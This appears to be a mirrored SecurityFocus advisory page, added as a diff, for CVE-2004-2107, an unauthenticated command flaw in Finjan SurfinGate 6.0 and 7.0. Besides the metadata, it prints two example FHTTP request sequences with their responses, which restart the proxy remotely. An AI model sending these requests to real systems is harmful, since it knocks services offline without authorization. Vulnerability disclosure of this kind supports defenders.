@@ -1,0 +1,106 @@
+#SpeeDr00t@Black Falcon<br>#bid9478<p><b><span style="font-size: 18pt;">Finjan SurfinGate FHTTP Restart Command Execution Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/9478/info">info</a><br><a href="http://www.securityfocus.com/bid/9478/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/9478/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/9478/solution">solution</a><br><a href="http://www.securityfocus.com/bid/9478/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				9478
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Access Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2004-2107<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jan 23 2004 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 12 2009 02:06AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery of this issue is credited to David Byrne.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Finjan Software SurfinGate 7.0 <br/>
+					
+				
+					Finjan Software SurfinGate 6.0 5<br/>
+					
+				
+					Finjan Software SurfinGate 6.0 1<br/>
+					
+				
+					Finjan Software SurfinGate 6.0 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following example requests were provided:<br/><br/>     Example 1:<br/>          &amp;gt;&amp;gt;&amp;gt; CONNECT LOCALHOST:3141 HTTP/1.0<br/>          &amp;gt;&amp;gt;&amp;gt;<br/><br/>          &amp;lt;&amp;lt;&amp;lt; HTTP/1.0 200 Connection established<br/>          &amp;lt;&amp;lt;&amp;lt; Proxy-agent: Finjan-SurfinGate/6.0<br/>          &amp;lt;&amp;lt;&amp;lt;<br/><br/>          &amp;gt;&amp;gt;&amp;gt; FINJAN /stam HTTP/1.0<br/>          &amp;gt;&amp;gt;&amp;gt; finjan-version: fhttp/1.0<br/>          &amp;gt;&amp;gt;&amp;gt; finjan-command: custom<br/>          &amp;gt;&amp;gt;&amp;gt; finjan-parameter-category: console<br/>          &amp;gt;&amp;gt;&amp;gt; finjan-parameter-type: restart<br/>          &amp;gt;&amp;gt;&amp;gt; content-length: 0<br/>          &amp;gt;&amp;gt;&amp;gt;<br/><br/>          &amp;lt;&amp;lt;&amp;lt; HTTP/1.0 200 OK<br/>          &amp;lt;&amp;lt;&amp;lt; finjan-version: fhttp/1.0<br/>          &amp;lt;&amp;lt;&amp;lt;<br/>          &amp;lt;&amp;lt;&amp;lt;<br/><br/><br/>     Example 2:<br/>          &amp;gt;&amp;gt;&amp;gt; FINJAN localhost:3141/stam HTTP/1.0<br/>          &amp;gt;&amp;gt;&amp;gt; finjan-version: fhttp/1.0<br/>          &amp;gt;&amp;gt;&amp;gt; finjan-command: custom<br/>          &amp;gt;&amp;gt;&amp;gt; finjan-parameter-category: console<br/>          &amp;gt;&amp;gt;&amp;gt; finjan-parameter-type: restart<br/>          &amp;gt;&amp;gt;&amp;gt; content-length: 0<br/>          &amp;gt;&amp;gt;&amp;gt;<br/><br/>          &amp;lt;&amp;lt;&amp;lt; HTTP/1.0 200 OK<br/>          &amp;lt;&amp;lt;&amp;lt; finjan-version: fhttp/1.0<br/>          &amp;lt;&amp;lt;&amp;lt;<br/>          &amp;lt;&amp;lt;&amp;lt;
+	
+		<ul>
+</ul>
+</div>
